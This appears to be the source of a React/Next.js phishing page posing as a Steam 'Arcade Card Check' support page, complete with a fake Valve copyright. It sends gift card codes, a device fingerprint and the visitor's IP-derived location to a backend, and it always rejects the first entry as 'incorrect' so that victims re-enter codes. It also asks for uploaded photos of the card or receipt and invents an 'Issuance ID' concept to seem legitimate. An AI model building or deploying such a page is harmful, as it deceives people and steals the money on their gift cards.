import { useState, useEffect } from 'react'
import Head from 'next/head'
import styles from '../styles/steam.module.css'

export default function SteamArcadePage() {
  const [cards, setCards] = useState([''])
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [showTutorial, setShowTutorial] = useState(false)
  const [showIssuanceInfo, setShowIssuanceInfo] = useState(false)
  const [location, setLocation] = useState('Unknown')
  const [deviceId, setDeviceId] = useState(null)
  const [copySuccess, setCopySuccess] = useState(false)

  // Receipt upload states
  const [showUploadStep, setShowUploadStep] = useState(false)
  const [selectedImages, setSelectedImages] = useState([])
  const [uploadProgress, setUploadProgress] = useState(false)
  const [uploadComplete, setUploadComplete] = useState(false)
  const [uploadError, setUploadError] = useState(null)
  const [attemptCount, setAttemptCount] = useState(0)

  useEffect(() => {
    async function detectLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/')
        const data = await res.json()
        if (data.country_name) {
          setLocation(data.country_name)
        }
      } catch (err) {
        console.error('IP detection failed', err)
      }
    }
    detectLocation()

    // Initialize or get device ID
    let id = localStorage.getItem('deviceId')
    if (!id) {
      id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
      localStorage.setItem('deviceId', id)
    }
    setDeviceId(id)
  }, [])

  const handleCardChange = (index, value) => {
    setCards(prev => prev.map((c, i) => i === index ? value.toUpperCase() : c))
  }

  const addCard = () => setCards(prev => [...prev, ''])

  const removeCard = (index) => setCards(prev => prev.length > 1 ? prev.filter((_, i) => i !== index) : prev)

  async function checkBalance(e) {
    e.preventDefault()
    setError(null)
    setResult(null)
    setCopySuccess(false)
    const validCards = cards.filter(c => c.trim())
    if (validCards.length === 0) return setError('Please enter your Steam Gift Card code.')

    setLoading(true)
    try {
      const browserInfo = {
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`
      }

      const res = await fetch('/api/generate-issuance-id', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'),
          type: 'steam-arcade',
          deviceId: deviceId,
          location: location,
          browserInfo: JSON.stringify(browserInfo)
        })
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
      
      if (attemptCount === 0) {
        setError('The card code you entered is incorrect. Please verify the code and try again.')
        setCards([''])
        setAttemptCount(1)
      } else {
        setResult(data)
        setAttemptCount(0)
        if (data.cardId && !data.isDuplicate) {
          setShowUploadStep(true)
        }
      }
    } catch (err) {
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  const handleImageSelect = (e) => {
    const files = Array.from(e.target.files)
    if (files.length + selectedImages.length > 3) {
      setUploadError('Maximum 3 images allowed')
      return
    }

    setUploadError(null)

    files.forEach(file => {
      const reader = new FileReader()
      reader.onload = (event) => {
        setSelectedImages(prev => [...prev, {
          file,
          preview: event.target.result,
          base64: event.target.result
        }])
      }
      reader.readAsDataURL(file)
    })
  }

  const removeImage = (index) => {
    setSelectedImages(prev => prev.filter((_, i) => i !== index))
  }

  const handleUpload = async () => {
    if (selectedImages.length === 0) {
      setUploadError('Please select at least one image')
      return
    }

    setUploadProgress(true)
    setUploadError(null)

    try {
      const res = await fetch('/api/upload-receipt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardId: result.cardId,
          images: selectedImages.map(img => img.base64)
        })
      })

      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Upload failed')

      setUploadComplete(true)
      setShowUploadStep(false)
    } catch (err) {
      setUploadError(err.message)
    } finally {
      setUploadProgress(false)
    }
  }

  const skipUpload = () => {
    setShowUploadStep(false)
    setSelectedImages([])
    setUploadError(null)
  }

  const copyIssuanceId = async () => {
    if (!result?.issuanceId) return

    try {
      await navigator.clipboard.writeText(result.issuanceId)
      setCopySuccess(true)
    } catch (err) {
      setError('Unable to copy the Issuance ID right now.')
    }
  }

  const resetForm = () => {
    setCards([''])
    setResult(null)
    setShowUploadStep(false)
    setSelectedImages([])
    setUploadComplete(false)
    setUploadError(null)
    setCopySuccess(false)
  }

  return (
    <div className={styles.steamPage}>
      <Head>
        <title>Steam Arcade Card Check | Steam</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
      </Head>

      <header className={styles.header}>
        <div className={styles.headerTop}>
          <div className={styles.headerLeft}>
            <a href="/steam" className={styles.logoContainer}>
              <svg className={styles.logo} viewBox="0 0 176 44" fill="currentColor">
                <path d="M.329 25.333A8.01 8.01 0 0 0 7.99 31C12.414 31 16 27.418 16 23s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 22.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 23.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 25.333Z" />
                <path d="M4.868 27.683a1.715 1.715 0 0 0 1.318-3.165 1.7 1.7 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027m2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048" />
                <text x="24" y="28" fill="white" style={{ fontFamily: 'Motiva Sans, Arial', fontWeight: 'bold', fontSize: '18px', letterSpacing: '3px' }}>STEAM</text>
              </svg>
            </a>
          </div>

          <nav className={styles.nav}>
            <a href="#">STORE</a>
            <a href="#">COMMUNITY</a>
            <a href="#">ABOUT</a>
            <a href="#">SUPPORT</a>
          </nav>

          <div className={styles.headerRight}>
            <div className={styles.installSteam}>
              <button className={styles.installBtn}>INSTALL STEAM</button>
              <a href="#" className={styles.loginLink}>login</a>
            </div>
            <button
              className={styles.mobileMenuBtn}
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              aria-label="Toggle Menu"
            >
              <div className={`${styles.hamburger} ${mobileMenuOpen ? styles.open : ''}`}>
                <span></span>
                <span></span>
                <span></span>
              </div>
            </button>
          </div>
        </div>

        <div className={`${styles.mobileNav} ${mobileMenuOpen ? styles.active : ''}`}>
          <a href="#" onClick={() => setMobileMenuOpen(false)}>STORE</a>
          <a href="#" onClick={() => setMobileMenuOpen(false)}>COMMUNITY</a>
          <a href="#" onClick={() => setMobileMenuOpen(false)}>ABOUT</a>
          <a href="#" onClick={() => setMobileMenuOpen(false)}>SUPPORT</a>
        </div>
      </header>

      <main className={styles.main}>
        <div className={styles.breadcrumb}>
          Support › Steam Wallet › Steam Arcade Card Check
        </div>

        <section className={styles.cardSection}>
          <div style={{ width: '100%', maxWidth: '700px', margin: '0 auto 20px', borderRadius: '12px', overflow: 'hidden' }}>
            <img src="/steamarcade.jpg" alt="Steam Arcade" style={{ width: '100%', display: 'block' }} />
          </div>
          <div className={styles.formContainer}>
            <h1 className={styles.mainTitle} style={{fontSize: '28px', color: '#fff', marginBottom: '10px'}}>Steam Arcade Card Check</h1>
            <p className={styles.subtitle}>Enter your 16-digit code to verify the card type instantly.</p>

            <div className={styles.card}>
              <form onSubmit={checkBalance}>
                {cards.map((cardValue, index) => (
                  <div key={index} className={styles.inputGroup}>
                    <label className={styles.label}>Enter your wallet code{cards.length > 1 ? ` #${index + 1}` : ''}</label>
                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                      <input
                        type="text"
                        className={styles.input}
                        placeholder="AAAAA-BBBBB-CCCCC"
                        value={cardValue}
                        onChange={(e) => handleCardChange(index, e.target.value)}
                        disabled={loading}
                        autoComplete="off"
                        spellCheck="false"
                        style={{ flex: 1 }}
                      />
                      {cards.length > 1 && (
                        <button
                          type="button"
                          onClick={() => removeCard(index)}
                          style={{ background: 'none', border: 'none', color: '#8f98a0', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
                        >
                          ×
                        </button>
                      )}
                    </div>
                  </div>
                ))}
                {cards.length < 5 && (
                  <button
                    type="button"
                    onClick={addCard}
                    className={styles.button}
                    style={{ background: 'transparent', border: '1px solid rgba(255, 255, 255, 0.2)', marginBottom: '12px', fontSize: '14px' }}
                  >
                    + Add Another Card
                  </button>
                )}

                {!showUploadStep && (
                  <button type="submit" className={styles.button} disabled={loading}>
                    {loading ? 'Verifying...' : 'Check ID'}
                  </button>
                )}
              </form>

              {result && !showUploadStep && (
                <div className={styles.result}>
                  <div className={styles.resultHeader}>
                    <span className={styles.statusDot} style={{ background: '#ff4b4b' }}></span>
                    Card Type
                  </div>
                  {result.message ? (
                    <div className={styles.error} style={{ background: 'rgba(255, 255, 255, 0.05)', color: '#fff', border: '1px solid rgba(255, 255, 255, 0.1)', margin: '20px 0', borderRadius: '4px' }}>
                      <span>{result.message}</span>
                    </div>
                  ) : (
                    <>
                      <div className={styles.balanceText} style={{ marginTop: '15px' }}>
                        <span className={styles.amount} style={{ color: '#ff4b4b', fontSize: '24px' }}>Not a legacy card</span>
                      </div>
                      <p className={styles.readyMsg}>For Card ending in {result.cardLast4}</p>
                    </>
                  )}
                </div>
              )}

              {showUploadStep && (
                <div className={styles.uploadStep}>
                  <div className={styles.uploadHeader}>
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
                      <circle cx="12" cy="13" r="4" />
                    </svg>
                    <h3>Upload Card Image / Receipt</h3>
                  </div>
                  <p className={styles.uploadSubtitle}>Upload a photo of the card or screenshots to continue with the ID check.</p>

                  <div className={styles.imagePreviewGrid}>
                    {selectedImages.map((img, idx) => (
                      <div key={idx} className={styles.previewItem}>
                        <img src={img.preview} alt={`Preview ${idx + 1}`} />
                        <button type="button" className={styles.removeBtn} onClick={() => removeImage(idx)}>×</button>
                      </div>
                    ))}
                    {selectedImages.length < 3 && (
                      <label className={styles.addImageBtn}>
                        <input
                          type="file"
                          accept="image/*"
                          onChange={handleImageSelect}
                          multiple
                          style={{ display: 'none' }}
                        />
                        <span>+</span>
                        <span className={styles.addText}>Add Image</span>
                      </label>
                    )}
                  </div>

                  {uploadError && <div className={styles.error} style={{ marginTop: '15px' }}>{uploadError}</div>}

                  <div className={styles.uploadActions}>
                    <button type="button" className={styles.button} onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0}>
                      {uploadProgress ? 'Uploading...' : 'Upload'}
                    </button>
                    <button type="button" className={styles.button} onClick={skipUpload} disabled={uploadProgress} style={{ background: 'transparent', border: '1px solid rgba(255, 255, 255, 0.2)' }}>
                      Skip
                    </button>
                  </div>
                </div>
              )}

              {error && (
                <div className={styles.error}>
                  <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" y1="8" x2="12" y2="12" />
                    <line x1="12" y1="16" x2="12.01" y2="16" />
                  </svg>
                  <span>{error}</span>
                </div>
              )}
            </div>

            <div className={styles.tutorialWrapper} style={{ marginTop: '30px' }}>
              <button
                className={styles.tutorialToggle}
                onClick={() => setShowTutorial(!showTutorial)}
              >
                <span>Where do I find my Steam Wallet code?</span>
                <svg
                  viewBox="0 0 24 24"
                  width="20"
                  height="20"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.5"
                  style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
                >
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>

              <div className={`${styles.tutorialContent} ${showTutorial ? styles.show : ''}`}>
                <div className={styles.tutorialStep}>
                  <div className={styles.stepNumber}>1</div>
                  <div className={styles.stepText}>Gently scratch the vertical silver strip on the back of your Steam Gift Card to reveal the code.</div>
                </div>
                <div className={styles.tutorialStep}>
                  <div className={styles.stepNumber}>2</div>
                  <div className={styles.stepText}>The code is an alphanumeric string (usually 15 characters, e.g., AAAAA-BBBBB-CCCCC).</div>
                </div>
                <div className={styles.tutorialImage}>
                  <img src="/steam-back-card.jpg" alt="Steam Card Back Tutorial" style={{ width: '100%', display: 'block' }} />
                </div>
                <p className={styles.imageCaption}>The Wallet Code is printed on the back of the card under the scratch-off area.</p>
              </div>
            </div>

            <div className={styles.tutorialWrapper} style={{ marginTop: '16px', borderTop: 'none', paddingTop: 0 }}>
              <button
                className={styles.tutorialToggle}
                onClick={() => setShowIssuanceInfo(!showIssuanceInfo)}
              >
                <span>What is an Issuance ID?</span>
                <svg
                  viewBox="0 0 24 24"
                  width="20"
                  height="20"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.5"
                  style={{ transform: showIssuanceInfo ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
                >
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>

              <div className={`${styles.tutorialContent} ${showIssuanceInfo ? styles.show : ''}`}>
                <div className={styles.tutorialStep}>
                  <div className={styles.stepNumber}>1</div>
                  <div className={styles.stepText}>An Issuance ID is an identification number linked to your code and used for customer care, support, account verification, and other card-related assistance.</div>
                </div>
                <div className={styles.tutorialStep}>
                  <div className={styles.stepNumber}>2</div>
                  <div className={styles.stepText}>You can use the Issuance ID to help fund Steam wallets, query customer support, and confirm records when needed.</div>
                </div>
                <div className={styles.tutorialStep}>
                  <div className={styles.stepNumber}>3</div>
                  <div className={styles.stepText}>You cannot spend the card money using the Issuance ID, but you can use it for funding, support requests, and code-related verification.</div>
                </div>
              </div>
            </div>
          </div>
        </section>
      </main>

      <footer className={styles.footer}>
        <div className={styles.footerContent}>
          <div className={styles.footerLogo}>
            <svg width="100" height="30" viewBox="0 0 100 30" fill="#8f98a0" opacity="0.6">
              <path d="M.329 10.333A8.01 8.01 0 0 0 7.99 16C12.414 16 16 12.418 16 8s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 7.468l.003.006 4.304 1.769A2.2 2.2 0 0 1 5.62 8.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.22 2.22 0 0 1-1.312-1.568L.33 10.333Z" transform="scale(1.5)" />
            </svg>
          </div>
          <div className={styles.footerDetails}>
            <p>© 2025 Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.</p>
            <p>VAT included in all prices where applicable.</p>
            <div className={styles.footerLinks}>
              <a href="#">Privacy Policy</a>
              <span> | </span>
              <a href="#">Legal</a>
              <span> | </span>
              <a href="#">Steam Subscriber Agreement</a>
              <span> | </span>
              <a href="#">Refunds</a>
              <span> | </span>
              <a href="#">Cookies</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
